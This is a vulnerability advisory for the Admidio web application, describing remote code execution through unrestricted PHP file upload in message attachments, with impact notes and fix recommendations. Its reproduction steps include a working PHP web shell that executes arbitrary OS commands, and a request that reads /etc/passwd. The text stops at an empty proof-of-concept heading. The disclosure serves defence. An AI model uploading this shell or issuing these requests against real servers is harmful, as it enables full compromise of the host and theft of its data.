summary: "Admidio Vulnerable to RCE via Arbitrary File Upload in Message Attachment\n### Description:\n\
  Remote Code Execution Vulnerability has been identified in the Message module of the Admidio\
  \ Application, where it is possible to upload a PHP file in the attachment. The uploaded file\
  \ can be accessed publicly through the URL `{admidio_base_url}/adm_my_files/messages_attachments/{file_name}`.\n\
  \nThe vulnerability is caused due to the lack of file extension verification, allowing malicious\
  \ files to be uploaded to the server and public availability of the uploaded file.\n\nAn attacker\
  \ can upload a PHP web shell that executes OS commands on the server, compromising the application\
  \ server.\n\nNote: I am using the docker-compose.yaml file from https://github.com/Admidio/admidio/blob/master/README-Docker.md#docker-compose-usage\
  \ official documentation.\n\n### Impact:\nAn attacker can exploit this flaw to upload a PHP\
  \ web shell, which can be used to execute arbitrary commands on the server. This can lead\
  \ to a complete compromise of the application server, allowing the attacker to:\n\n- Execute\
  \ arbitrary code or commands.\n- Access, modify, or delete sensitive data.\n- Install malicious\
  \ software or scripts.\n- Gain further access to internal networks.\n- Disrupt services and\
  \ applications hosted on the server.\n\n### Recommendation:\n\n- Implement strict file extension\
  \ verification to ensure that only allowed file types (e.g., images, documents) can be uploaded.\n\
  - Reject any file upload with disallowed or suspicious extensions such as .php, .phtml, .exe,\
  \ etc.\n\n### Steps to Reproduce:\n1. As a member user, go to write an email message.\n2.\
  \ Upload a PHP file in the Attachment, containing the following content:\n```\n<?php\n$command\
  \ = isset($_GET['command']) ? $_GET['command'] : '';\n$output = [];\n$return_var = 0;\nexec($command,\
  \ $output, $return_var);\necho '<h1>Exploiting RCE</h1>';\necho 'Command: '.$command;\necho\
  \ '\\n<pre>';\necho implode(\"\\n\", $output);\necho '</pre>';\n?>\n```\n3. Send the email.\n\
  4. In the message history go to the sent message.\n5. Download the file, to get the uploaded\
  \ file name.\n6. Go to the following URL: \n`{admidio_base_url}/adm_my_files/messages_attachments/{file_name}?command=cat+/etc/passwd`\n\
  7. The server's passwd file would be returned in the response.\n\n### Proof Of Concept:\n\n\
